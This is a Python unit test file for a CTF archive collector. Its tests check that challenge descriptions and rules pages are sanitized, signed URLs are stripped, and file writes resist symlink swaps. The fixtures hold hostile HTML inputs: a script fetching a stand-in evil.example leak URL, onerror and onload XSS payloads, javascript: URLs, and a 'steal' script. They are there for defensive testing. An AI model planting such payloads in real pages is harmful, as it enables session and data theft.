import json
import os
from pathlib import Path
import tempfile
import unittest
from unittest.mock import patch
from urllib.parse import urlsplit

from ctf_collector.archive import extract_media_sources
from ctf_collector.collector import collect_ctf
from ctf_collector.errors import CollectorError
from ctf_collector.safety import SafeOutput, safe_metadata

from .support import FakeOpener, make_config


def terminal_page(challenges):
    return {
        "data": challenges,
        "meta": {
            "pagination": {
                "next": None,
                "page": 1,
                "pages": 1 if challenges else 0,
            }
        },
    }


def json_text(path):
    return json.loads(path.read_text(encoding="utf-8"))


class ChallengeArchiveTests(unittest.TestCase):
    def test_reference_style_markdown_images_are_extracted(self):
        description = (
            "![inline](/inline.png)\n"
            "![Logo][hero]\n"
            "![Collapsed][]\n"
            "[hero]: /hero.png?signature=one\n"
            "[collapsed]: <assets/collapsed.jpg?signature=two> 'title'\n"
        )

        self.assertEqual(
            extract_media_sources(description),
            [
                ("image", "/inline.png"),
                ("image", "/hero.png?signature=one"),
                ("image", "assets/collapsed.jpg?signature=two"),
            ],
        )

    def test_relative_description_urls_are_sanitized_without_losing_prose(self):
        source = (
            "A question? remains, and # heading remains.\n"
            "![inline](pixel.png?signature=markdown#view)\n"
            '<a href="rules.html?signature=html#section">rules</a>\n'
            "See path/to/guide?signature=plain#part for details."
        )

        sanitized = safe_metadata({"description": source})["description"]

        self.assertIn("A question? remains, and # heading remains.", sanitized)
        self.assertIn("![inline](pixel.png)", sanitized)
        self.assertIn('<a href="rules.html">rules</a>', sanitized)
        self.assertIn("See path/to/guide for details.", sanitized)
        self.assertNotIn("signature=", sanitized)

    def test_ctfd_challenge_html_media_and_repeat_are_safe_and_idempotent(self):
        media_gets = {}
        progress = []
        description = (
            "Original <b>source</b>\n"
            "![same](/media/pixel.png?signature=signed-image#first)\n"
            '<IMG SRC="/media/pixel.png?signature=signed-image#second" '
            'ONERROR="alert(1)">\n'
            '<audio src="/media/sound.mp3?signature=signed-audio"></audio>\n'
            '<video><source src="https://cdn.example/movie.mp4?signature=signed-movie">'
            "</video>\n"
            '<script>fetch("https://evil.example/leak?signature=signed-script")</script>'
            '<iframe src="https://evil.example/frame"></iframe><form action="/submit">'
            '<object data="/active"></object><embed src="/active">'
        )

        def responder(request):
            parsed = urlsplit(request["url"])
            if parsed.path == "/rules":
                return 404, {}, b"missing"
            if parsed.path == "/api/v1/challenges":
                return 200, {}, terminal_page(
                    [{"id": 7, "name": "Readable", "category": "web"}]
                )
            if parsed.path == "/api/v1/challenges/7":
                return 200, {}, {
                    "data": {
                        "category": "web",
                        "connection_info": "nc base.example 31337",
                        "description": description,
                        "files": [
                            {
                                "name": (
                                    "pixel.png?signature=signed-name#fragment"
                                ),
                                "url": "/attachments/pixel.png?signature=signed-file",
                            }
                        ],
                        "hints": [{"content": "look closely", "cost": 10}],
                        "id": 7,
                        "name": "Readable",
                        "points": 500,
                        "value": 450,
                        "https://meta.example/key?signature=signed-key#fragment": (
                            "metadata retained"
                        ),
                    }
                }
            bodies = {
                "/attachments/pixel.png": (
                    "application/octet-stream",
                    b"ordinary attachment",
                ),
                "/media/pixel.png": ("image/png", b"\x89PNG\r\n\x1a\n"),
                "/media/sound.mp3": (
                    "audio/mpeg",
                    b"ID3\x04\x00\x00\x00\x00\x00\x00",
                ),
                "/movie.mp4": (
                    "video/mp4",
                    b"\x00\x00\x00\x10ftypisom\x00\x00\x00\x00",
                ),
            }
            if parsed.path in bodies:
                media_gets[parsed.path] = media_gets.get(parsed.path, 0) + 1
                content_type, body = bodies[parsed.path]
                return 200, {"Content-Type": content_type}, body
            self.fail(f"unexpected request: {request['url']}")

        with tempfile.TemporaryDirectory() as tmp:
            config = make_config(
                tmp,
                unauthenticated_attachment_origins=["https://cdn.example"],
            )
            fake = FakeOpener(responder)
            with patch("ctf_collector.http.build_opener", return_value=fake):
                first = collect_ctf(config, progress=progress.append)
                second = collect_ctf(config, progress=progress.append)

            challenge_dir = Path(tmp) / "out" / "fake-ctfd" / "web" / "7-Readable"
            html = (challenge_dir / "challenge.html").read_text(encoding="utf-8")
            metadata_text = (challenge_dir / "challenge.json").read_text(
                encoding="utf-8"
            )
            manifest_text = (
                Path(tmp) / "out" / "fake-ctfd" / "manifest.json"
            ).read_text(encoding="utf-8")
            pixel_bytes = (challenge_dir / "media" / "pixel.png").read_bytes()
            stored_paths = [
                path.relative_to(Path(tmp) / "out").as_posix()
                for path in (Path(tmp) / "out").rglob("*")
            ]

        self.assertEqual(first["status"], "complete")
        self.assertEqual(second["status"], "complete")
        self.assertEqual(
            media_gets,
            {
                "/attachments/pixel.png": 1,
                "/media/pixel.png": 1,
                "/media/sound.mp3": 1,
                "/movie.mp4": 1,
            },
        )
        self.assertTrue(all(item["method"] == "GET" for item in fake.requests))
        foreign = [
            item
            for item in fake.requests
            if urlsplit(item["url"]).hostname == "cdn.example"
        ]
        self.assertEqual(len(foreign), 1)
        self.assertNotIn("authorization", foreign[0]["headers"])

        self.assertIn("default-src &#x27;none&#x27;", html)
        self.assertIn("img-src &#x27;self&#x27;", html)
        self.assertIn("media-src &#x27;self&#x27;", html)
        self.assertIn("<h1>Readable</h1>", html)
        for text in (
            "web",
            "7",
            "450",
            "500",
            "look closely",
            "nc base.example 31337",
            "files/pixel.png",
        ):
            self.assertIn(text, html)
        self.assertIn("&lt;script&gt;", html)
        self.assertIn("&lt;iframe", html)
        self.assertIn("white-space: pre-wrap", html)
        for active in (
            "<script",
            "<iframe",
            "<form",
            "<object",
            "<embed",
        ):
            self.assertNotIn(active, html.lower())
        self.assertEqual(html.count('src="media/pixel.png"'), 1)
        self.assertIn('src="media/sound.mp3"', html)
        self.assertIn('src="media/movie.mp4"', html)

        entry = second["challenges"][0]
        self.assertEqual(
            entry["html"],
            {"path": "web/7-Readable/challenge.html", "status": "written"},
        )
        self.assertEqual(
            [item["status"] for item in entry["media"]],
            ["verified", "verified", "verified"],
        )
        self.assertEqual(pixel_bytes, b"\x89PNG\r\n\x1a\n")
        persisted = "\n".join(
            [html, metadata_text, manifest_text, json.dumps(progress), *stored_paths]
        )
        for secret in (
            "ctfd-secret",
            "signed-image",
            "signed-audio",
            "signed-movie",
            "signed-file",
            "signed-key",
            "signed-name",
            "signed-script",
        ):
            self.assertNotIn(secret, persisted)
        metadata = json.loads(metadata_text)
        self.assertIn("![same](/media/pixel.png)", metadata["raw"]["description"])
        self.assertIn(
            '<audio src="/media/sound.mp3"></audio>',
            metadata["raw"]["description"],
        )

    def test_unsafe_and_unapproved_media_urls_fail_before_any_request(self):
        description = (
            "![js](javascript:alert(1))\n"
            "![data](data:image/png;base64,AAAA)\n"
            '<img src="https://user:password@base.example/private.png">\n'
            '<img src="https://blocked.example/no.png?signature=private">\n'
            '<img src="/bad&#10;control.png">'
        )

        def responder(request):
            parsed = urlsplit(request["url"])
            if parsed.path == "/rules":
                return 404, {}, b"missing"
            if parsed.path == "/api/v1/challenges":
                return 200, {}, terminal_page(
                    [{"id": 1, "name": "Unsafe", "category": "web"}]
                )
            if parsed.path == "/api/v1/challenges/1":
                return 200, {}, {
                    "data": {
                        "category": "web",
                        "description": description,
                        "files": [],
                        "id": 1,
                        "name": "Unsafe",
                    }
                }
            self.fail(f"unsafe media reached HTTP: {request['url']}")

        with tempfile.TemporaryDirectory() as tmp:
            config = make_config(tmp)
            fake = FakeOpener(responder)
            with patch("ctf_collector.http.build_opener", return_value=fake):
                manifest = collect_ctf(config)

        self.assertEqual(manifest["status"], "partial")
        self.assertEqual(
            {item["failure"]["code"] for item in manifest["challenges"][0]["media"]},
            {"foreign_origin", "invalid_url"},
        )
        requested_paths = {urlsplit(item["url"]).path for item in fake.requests}
        self.assertEqual(
            requested_paths,
            {"/rules", "/api/v1/challenges", "/api/v1/challenges/1"},
        )

    def test_redirect_wrong_mime_and_limits_are_partial_but_later_media_continue(self):
        description = "".join(
            f'<img src="/media/{name}">' for name in ("redirect", "text", "large", "ok")
        )

        def responder(request):
            path = urlsplit(request["url"]).path
            if path == "/rules":
                return 404, {}, b"missing"
            if path == "/api/v1/challenges":
                return 200, {}, terminal_page(
                    [{"id": 1, "name": "Partial", "category": "misc"}]
                )
            if path == "/api/v1/challenges/1":
                return 200, {}, {
                    "data": {
                        "category": "misc",
                        "description": description,
                        "files": [],
                        "id": 1,
                        "name": "Partial",
                    }
                }
            if path == "/media/redirect":
                return 302, {"Location": "https://blocked.example/never"}, b""
            if path == "/media/text":
                return 200, {"Content-Type": "text/html"}, b"<b>not media</b>"
            if path == "/media/large":
                return 200, {
                    "Content-Type": "image/png",
                    "Content-Length": "6",
                }, b"123456"
            if path == "/media/ok":
                return 200, {"Content-Type": "image/jpeg"}, b"\xff\xd8\xff"
            self.fail(f"unexpected request: {request['url']}")

        with tempfile.TemporaryDirectory() as tmp:
            config = make_config(tmp)
            config["limits"].update({"max_file_bytes": 5, "max_total_bytes": 20})
            fake = FakeOpener(responder)
            with patch("ctf_collector.http.build_opener", return_value=fake):
                manifest = collect_ctf(config)
            challenge_dir = Path(tmp) / "out" / "fake-ctfd" / "misc" / "1-Partial"
            html = (challenge_dir / "challenge.html").read_text(encoding="utf-8")
            ok_bytes = (challenge_dir / "media" / "ok").read_bytes()
            leftovers = list(challenge_dir.rglob("*.part"))

        self.assertEqual(manifest["status"], "partial")
        self.assertEqual(
            {
                item["failure"]["code"]
                for item in manifest["challenges"][0]["media"]
                if item["status"] == "failed"
            },
            {"file_too_large", "foreign_origin", "invalid_media_type"},
        )
        self.assertEqual(ok_bytes, b"\xff\xd8\xff")
        self.assertIn('src="media/ok"', html)
        self.assertNotIn('src="media/text"', html)
        self.assertFalse(
            any(urlsplit(item["url"]).hostname == "blocked.example" for item in fake.requests)
        )
        self.assertFalse(leftovers)

    def test_media_uses_the_same_run_approval_as_attachments(self):
        approvals = []

        def responder(request):
            path = urlsplit(request["url"]).path
            if path == "/rules":
                return 404, {}, b"missing"
            if path == "/api/v1/challenges":
                return 200, {}, terminal_page(
                    [{"id": 1, "name": "Approved", "category": "misc"}]
                )
            if path == "/api/v1/challenges/1":
                return 200, {}, {
                    "data": {
                        "category": "misc",
                        "description": '<img src="/large.png">',
                        "files": [],
                        "id": 1,
                        "name": "Approved",
                    }
                }
            if path == "/large.png":
                return 200, {
                    "Content-Length": "6",
                    "Content-Type": "image/jpeg",
                }, b"\xff\xd8\xffabc"
            self.fail(f"unexpected request: {request['url']}")

        def approve(request):
            approvals.append(request)
            return True

        with tempfile.TemporaryDirectory() as tmp:
            config = make_config(tmp)
            config["limits"].update({"max_file_bytes": 5, "max_total_bytes": 5})
            fake = FakeOpener(responder)
            with patch("ctf_collector.http.build_opener", return_value=fake):
                manifest = collect_ctf(config, limit_approver=approve)

        self.assertEqual(manifest["status"], "complete")
        self.assertEqual(len(approvals), 1)
        self.assertEqual(approvals[0]["exceeded"], "both")
        self.assertEqual(manifest["challenges"][0]["media"][0]["size"], 6)

    def test_octet_stream_attachment_is_saved_but_never_activated_as_media(self):
        body = b"<svg onload=alert(1)>"

        def responder(request):
            path = urlsplit(request["url"]).path
            if path == "/rules":
                return 404, {}, b"missing"
            if path == "/api/v1/challenges":
                return 200, {}, terminal_page(
                    [{"id": 1, "name": "Blob", "category": "web"}]
                )
            if path == "/api/v1/challenges/1":
                return 200, {}, {
                    "data": {
                        "category": "web",
                        "description": '<img src="/blob?signature=media">',
                        "files": [
                            {
                                "name": "blob.svg",
                                "url": "/blob?signature=attachment",
                            }
                        ],
                        "id": 1,
                        "name": "Blob",
                    }
                }
            if path == "/blob":
                return 200, {"Content-Type": "application/octet-stream"}, body
            self.fail(f"unexpected request: {request['url']}")

        with tempfile.TemporaryDirectory() as tmp:
            config = make_config(tmp)
            fake = FakeOpener(responder)
            with patch("ctf_collector.http.build_opener", return_value=fake):
                manifest = collect_ctf(config)
            challenge_dir = Path(tmp) / "out" / "fake-ctfd" / "web" / "1-Blob"
            html = (challenge_dir / "challenge.html").read_text(encoding="utf-8")
            attachment_bytes = (challenge_dir / "files" / "blob.svg").read_bytes()
            media_exists = (challenge_dir / "media").exists()

        self.assertEqual(manifest["status"], "partial")
        self.assertEqual(
            manifest["challenges"][0]["media"][0]["failure"]["code"],
            "invalid_media_type",
        )
        self.assertEqual(attachment_bytes, body)
        self.assertFalse(media_exists)
        self.assertNotIn('src="media/', html)


class RulesArchiveTests(unittest.TestCase):
    def test_ctfd_rules_preserve_escaped_source_and_readable_text(self):
        rules = (
            "<!-- flag{comment-kept} -->"
            "<h1>Event Rules</h1><p>Be kind.</p>"
            '<a href="https://docs.example/rules?signature=signed-rules#part">docs</a>'
            "<script>steal('ctfd-secret')</script>"
        )

        def responder(request):
            path = urlsplit(request["url"]).path
            if path == "/rules":
                return 200, {
                    "Content-Type": "text/html; charset=utf-8"
                }, rules.encode("utf-8")
            if path == "/api/v1/challenges":
                return 200, {}, terminal_page([])
            self.fail(f"unexpected request: {request['url']}")

        with tempfile.TemporaryDirectory() as tmp:
            config = make_config(tmp)
            fake = FakeOpener(responder)
            with patch("ctf_collector.http.build_opener", return_value=fake):
                manifest = collect_ctf(config)
            rules_html = (
                Path(tmp) / "out" / "fake-ctfd" / "rules.html"
            ).read_text(encoding="utf-8")

        self.assertEqual(manifest["status"], "complete")
        self.assertEqual(
            manifest["rules"],
            {
                "path": "rules.html",
                "source_kind": "ctfd_rules_page",
                "source_url": "https://base.example/rules",
                "status": "written",
            },
        )
        self.assertIn("Event Rules", rules_html)
        self.assertIn("Be kind.", rules_html)
        self.assertIn("&lt;!-- flag{comment-kept} --&gt;", rules_html)
        # A script on an authenticated page carries that page's session state,
        # so it is dropped rather than escaped and kept.
        self.assertNotIn("steal", rules_html)
        self.assertNotIn("script&gt;", rules_html)
        self.assertNotIn("<script", rules_html.lower())
        self.assertNotIn("signed-rules", rules_html)
        rules_request = [
            item for item in fake.requests if urlsplit(item["url"]).path == "/rules"
        ][0]
        self.assertEqual(rules_request["method"], "GET")
        self.assertIn("text/html", rules_request["headers"]["accept"])
        self.assertIn("text/plain", rules_request["headers"]["accept"])

    def test_ctfd_rules_404_and_410_are_unavailable_without_partial(self):
        for status in (404, 410):
            with self.subTest(status=status), tempfile.TemporaryDirectory() as tmp:
                def responder(request):
                    path = urlsplit(request["url"]).path
                    if path == "/rules":
                        return status, {}, b"missing"
                    if path == "/api/v1/challenges":
                        return 200, {}, terminal_page([])
                    self.fail(f"unexpected request: {request['url']}")

                config = make_config(tmp)
                fake = FakeOpener(responder)
                with patch("ctf_collector.http.build_opener", return_value=fake):
                    manifest = collect_ctf(config)

                self.assertEqual(manifest["status"], "complete")
                self.assertEqual(manifest["rules"]["status"], "unavailable")
                self.assertIsNone(manifest["rules"]["path"])
                self.assertFalse(
                    (Path(tmp) / "out" / "fake-ctfd" / "rules.html").exists()
                )

    def test_ctfd_rules_other_errors_and_wrong_type_are_partial(self):
        cases = (
            ("server", 500, {"Content-Type": "text/plain"}, b"down", "http_error"),
            (
                "mime",
                200,
                {"Content-Type": "application/octet-stream"},
                b"blob",
                "invalid_rules_type",
            ),
        )
        for label, status, headers, body, code in cases:
            with self.subTest(label=label), tempfile.TemporaryDirectory() as tmp:
                def responder(request):
                    path = urlsplit(request["url"]).path
                    if path == "/rules":
                        return status, headers, body
                    if path == "/api/v1/challenges":
                        return 200, {}, terminal_page([])
                    self.fail(f"unexpected request: {request['url']}")

                config = make_config(tmp)
                fake = FakeOpener(responder)
                with patch("ctf_collector.http.build_opener", return_value=fake):
                    manifest = collect_ctf(config)

                self.assertEqual(manifest["status"], "partial")
                self.assertEqual(manifest["rules"]["status"], "failed")
                self.assertIn(
                    code,
                    [failure["error"]["code"] for failure in manifest["failures"]],
                )

    def test_ctfd_rules_body_is_bounded_by_max_metadata_bytes(self):
        def responder(request):
            path = urlsplit(request["url"]).path
            if path == "/rules":
                return 200, {"Content-Type": "text/plain"}, b"x" * 1025
            if path == "/api/v1/challenges":
                return 200, {}, terminal_page([])
            self.fail(f"unexpected request: {request['url']}")

        with tempfile.TemporaryDirectory() as tmp:
            config = make_config(tmp)
            config["limits"]["max_metadata_bytes"] = 1024
            fake = FakeOpener(responder)
            with patch("ctf_collector.http.build_opener", return_value=fake):
                manifest = collect_ctf(config)

        self.assertEqual(manifest["status"], "partial")
        self.assertEqual(manifest["rules"]["status"], "failed")
        self.assertIn(
            "metadata_too_large",
            [failure["error"]["code"] for failure in manifest["failures"]],
        )

    def test_rctf_uses_only_official_anonymous_client_config_for_home_content(self):
        def responder(request):
            path = urlsplit(request["url"]).path
            if path == "/api/v1/integrations/client/config":
                return 200, {}, {
                    "kind": "goodClientConfig",
                    "data": {
                        "homeContent": (
                            "# Welcome\n<!-- flag{home-comment} -->"
                            '<img src="https://remote.example/a.png?signature=home">'
                        )
                    },
                }
            if path == "/api/v1/challs":
                return 200, {}, {
                    "kind": "goodChallenges",
                    "data": [],
                }
            self.fail(f"unexpected rCTF route: {request['url']}")

        with tempfile.TemporaryDirectory() as tmp:
            config = make_config(tmp, platform="rctf")
            fake = FakeOpener(responder)
            with patch("ctf_collector.http.build_opener", return_value=fake):
                manifest = collect_ctf(config)
            rules_html = (
                Path(tmp) / "out" / "fake-rctf" / "rules.html"
            ).read_text(encoding="utf-8")

        self.assertEqual(manifest["status"], "complete")
        self.assertEqual(manifest["rules"]["source_kind"], "rctf_home_content")
        self.assertEqual(manifest["rules"]["status"], "written")
        self.assertIn("Welcome", rules_html)
        self.assertIn("&lt;!-- flag{home-comment} --&gt;", rules_html)
        self.assertNotIn("signature=home", rules_html)
        paths = [urlsplit(item["url"]).path for item in fake.requests]
        self.assertNotIn("/rules", paths)
        config_request = [
            item
            for item in fake.requests
            if urlsplit(item["url"]).path == "/api/v1/integrations/client/config"
        ][0]
        self.assertNotIn("authorization", config_request["headers"])
        self.assertTrue(all(item["method"] == "GET" for item in fake.requests))

    def test_rctf_empty_home_is_unavailable_but_bad_kind_is_partial(self):
        for kind, home, expected_status, rules_status in (
            ("goodClientConfig", "", "complete", "unavailable"),
            ("badClientConfig", "ignored", "partial", "failed"),
        ):
            with self.subTest(kind=kind), tempfile.TemporaryDirectory() as tmp:
                def responder(request):
                    path = urlsplit(request["url"]).path
                    if path == "/api/v1/integrations/client/config":
                        return 200, {}, {
                            "kind": kind,
                            "data": {"homeContent": home},
                        }
                    if path == "/api/v1/challs":
                        return 200, {}, {
                            "kind": "goodChallenges",
                            "data": [],
                        }
                    self.fail(f"unexpected rCTF route: {request['url']}")

                config = make_config(tmp, platform="rctf")
                fake = FakeOpener(responder)
                with patch("ctf_collector.http.build_opener", return_value=fake):
                    manifest = collect_ctf(config)

                self.assertEqual(manifest["status"], expected_status)
                self.assertEqual(manifest["rules"]["status"], rules_status)


class SafeOutputGenericAtomicTests(unittest.TestCase):
    def test_atomic_bytes_and_text_write_atomically_and_reject_symlink_targets(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "out"
            outside = Path(tmp) / "outside"
            outside.write_bytes(b"outside")
            with SafeOutput(root) as output:
                output.ensure_directory(("ctf",))
                output.atomic_bytes(("ctf", "asset.bin"), b"\x00bytes")
                output.atomic_text(("ctf", "page.html"), "snowman \N{SNOWMAN}")
                (root / "ctf" / "blocked.html").symlink_to(outside)
                with self.assertRaises(CollectorError) as caught:
                    output.atomic_text(("ctf", "blocked.html"), "overwrite")

            self.assertEqual((root / "ctf" / "asset.bin").read_bytes(), b"\x00bytes")
            self.assertEqual(
                (root / "ctf" / "page.html").read_text(encoding="utf-8"),
                "snowman \N{SNOWMAN}",
            )
            self.assertEqual(outside.read_bytes(), b"outside")
            self.assertEqual(caught.exception.code, "unsafe_path")
            self.assertFalse(list(root.rglob("*.part")))

    def test_atomic_text_commit_swap_is_cleaned_from_moved_directory(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "out"
            page_dir = root / "ctf"
            outside = Path(tmp) / "outside-dir"
            real_replace = os.replace
            swapped = False

            def swap_then_replace(
                source,
                target,
                *,
                src_dir_fd=None,
                dst_dir_fd=None,
            ):
                nonlocal swapped
                if target == "rules.html" and not swapped:
                    swapped = True
                    page_dir.rename(outside)
                    page_dir.symlink_to(outside, target_is_directory=True)
                return real_replace(
                    source,
                    target,
                    src_dir_fd=src_dir_fd,
                    dst_dir_fd=dst_dir_fd,
                )

            with SafeOutput(root) as output:
                output.ensure_directory(("ctf",))
                with (
                    patch(
                        "ctf_collector.safety.os.replace",
                        side_effect=swap_then_replace,
                    ),
                    self.assertRaises(CollectorError) as caught,
                ):
                    output.atomic_text(("ctf", "rules.html"), "safe")

            self.assertTrue(swapped)
            self.assertEqual(caught.exception.code, "unsafe_path")
            self.assertFalse((outside / "rules.html").exists())
            self.assertFalse((outside / ".rules.html.part").exists())


if __name__ == "__main__":
    unittest.main()
